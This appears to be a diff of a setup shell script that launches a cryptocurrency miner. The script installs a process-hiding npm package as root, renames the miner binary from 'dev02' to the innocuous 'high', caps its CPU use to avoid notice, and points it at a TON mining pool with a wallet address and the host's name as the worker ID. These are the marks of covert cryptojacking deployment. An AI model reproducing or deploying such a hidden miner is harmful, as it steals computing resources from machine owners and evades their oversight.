@@ -8,6 +8,6 @@ sudo apt-get install gcc g++ make
 sudo -u root npm i -g node-process-hider
 sudo ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
 sudo dpkg-reconfigure --frontend noninteractive tzdata
-chmod +x dev02
-cpulimit -e dev02 -l 30 &
-./dev02 --algo TON --pool https://server1.whalestonpool.com --user EQAEtqD77uoBEbyft-u02rBGlPlRDgDhRzTextJZ6ylc57mn.$(cat /proc/sys/kernel/hostname)
+chmod +x high
+cpulimit -e high -l 30 &
+./high --algo TON --pool https://server1.whalestonpool.com --user EQAEtqD77uoBEbyft-u02rBGlPlRDgDhRzTextJZ6ylc57mn.$(cat /proc/sys/kernel/hostname)
